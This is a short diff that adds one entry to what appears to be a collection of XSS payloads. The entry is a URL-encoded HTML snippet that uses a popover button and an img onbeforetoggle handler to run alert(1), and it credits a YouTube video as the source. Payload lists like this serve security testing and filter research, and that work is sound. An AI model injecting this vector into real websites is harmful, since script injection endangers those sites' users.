@@ -1,0 +1,3 @@
+
+Payload: <button%20popovertarget=x>Click%20me</button><img%20onbeforetoggle=alert(1)%20popover%20id=x>XSS
+source https://www.youtube.com/watch?v=4_VbPem6gxI&ab_channel=BePractical
